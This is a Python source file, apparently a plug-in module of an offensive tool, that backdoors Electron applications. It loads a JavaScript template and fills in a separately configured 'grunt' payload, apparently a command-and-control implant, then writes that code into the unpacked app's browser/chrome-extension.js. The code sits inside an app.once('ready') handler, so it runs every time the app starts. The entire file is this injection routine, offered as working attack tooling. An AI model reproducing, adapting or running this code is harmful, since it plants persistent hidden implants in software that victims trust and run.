import pprint, os

class worker:
    def __init__(self, utils):
        self.utils = utils

    def run(self, worker_data):
        module = worker_data['module']
        module_data = worker_data['module_data']
        asar_working_path = worker_data['asar_working_path']

        # Now we need to inject the app events.
        file_to_inject = os.path.join(asar_working_path, 'browser', 'chrome-extension.js')
        if os.path.isfile(file_to_inject) is False:
            return False

        file_contents = self.utils.load_file(file_to_inject)
        payload = self.utils.load_file(os.path.join(module['path'], 'templates', 'code.js'))
        path_payload = module_data['grunt']['path_payload']

        if os.path.isfile(path_payload) is False:
            return False
        file_grunt = self.utils.load_file(path_payload).strip()

        payload = payload.replace('%PAYLOAD%', str(file_grunt))

        file_contents = self.utils.inject_code(file_contents, 'app.once', 'ready', payload, "app.once('ready', function () {\n\n%FUNCTION_CODE%\n\n});")

        print(file_contents)
        with open(file_to_inject, 'w') as f:
            f.write(file_contents)

        return True
